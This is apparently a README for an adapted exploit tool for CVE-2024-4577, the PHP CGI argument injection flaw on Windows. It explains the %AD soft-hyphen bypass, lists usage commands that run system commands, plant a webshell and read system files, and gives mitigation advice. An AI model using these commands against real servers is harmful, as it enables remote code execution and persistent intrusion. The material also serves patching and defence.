PHP CGI Argument Injection (CVE-2024-4577)
==========================================

**Original Discovery:** Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)  
**Original Exploit:**   Aliz Hammond (@AlizTheHax0r), Sina Kheirkhah (@SinSinology) - watchTowr  
**Adapted by:**         Hyperion Gray Security Research Team  
**Date:**               2024-06-06 (discovery) / 2024-11-16 (adaptation)  
**CVE:**                [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)  
**Advisory:**           https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/  
**Tested on:**          Windows Server with PHP 8.1.28 (CGI mode)

Overview
--------

CVE-2024-4577 is a critical remote code execution vulnerability in PHP's CGI implementation
on Windows systems. The vulnerability stems from improper handling of command-line arguments
when PHP is running in CGI mode, allowing attackers to inject arbitrary PHP code execution
arguments via specially crafted HTTP requests.

The exploit leverages Windows-specific character encoding behavior where certain characters
(specifically the soft hyphen `%AD`) are misinterpreted, allowing security filters to be
bypassed. This enables an attacker to inject PHP configuration directives that lead to
remote code execution.

Affected Versions
----------------

This vulnerability affects all versions of PHP installed on Windows operating systems:

- PHP 8.3 < 8.3.8
- PHP 8.2 < 8.2.20
- PHP 8.1 < 8.1.29
- PHP 8.0 and earlier (End-of-Life versions)

**Note:** PHP 7.x, 8.0, and earlier are End-of-Life and no longer receive security updates.

Technical Details
----------------

The vulnerability exploits a character encoding issue in Windows locales where the soft
hyphen character (`U+00AD`) is incorrectly handled. When this character is URL-encoded
as `%AD` and placed before a hyphen in the query string, Windows interprets it as a
valid command-line argument separator.

The exploit injects the following PHP directives:
- `allow_url_include=1` - Enables remote file inclusion
- `auto_prepend_file=php://input` - Instructs PHP to execute POST data as PHP code

This combination allows arbitrary PHP code sent in the POST body to be executed on the
target system.

Installation
-----------

Install required dependencies:

```bash
pip install requests
```

Usage
-----

Basic usage to execute a command on the target:

```bash
python exploit.py -t http://target.com/index.php -c "<?php system('whoami'); ?>"
```

Example to create a webshell:

```bash
python exploit.py -t http://target.com/index.php -c "<?php system(\$_GET['cmd']); ?>"
```

Example to read sensitive files:

```bash
python exploit.py -t http://target.com/index.php -c "<?php echo file_get_contents('C:/Windows/System32/drivers/etc/hosts'); ?>"
```

### Attack Scenario

1. Identify a Windows server running vulnerable PHP in CGI mode
2. Craft a payload with the desired command
3. Execute the exploit
4. Verify execution through command output or side effects

Mitigation
----------

### Immediate Actions
1. Upgrade to patched PHP versions:
   - PHP 8.3.8 or later
   - PHP 8.2.20 or later
   - PHP 8.1.29 or later

2. If immediate patching is not possible:
   - Disable CGI mode and use FastCGI or mod_php instead
   - Implement URL filtering to block requests containing encoded characters
   - Use Web Application Firewall (WAF) rules to detect and block exploit attempts

### Long-term Recommendations
- Keep PHP and web server software updated
- Use FastCGI or FPM instead of CGI mode when possible
- Implement defense-in-depth security measures
- Monitor logs for suspicious patterns

References
----------

- [DEVCORE Advisory](https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/)
- [Orange Tsai's Blog Post](https://blog.orange.tw/2024/06/cve-2024-4577-yet-another-php-rce.html)
- [watchTowr Labs Analysis](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)
- [Original GitHub PoC](https://github.com/watchtowrlabs/CVE-2024-4577)

Legal Notice
-----------

This exploit is provided for educational and authorized penetration testing purposes only.
Unauthorized access to computer systems is illegal. Always obtain explicit permission
before testing security vulnerabilities on any system you do not own.
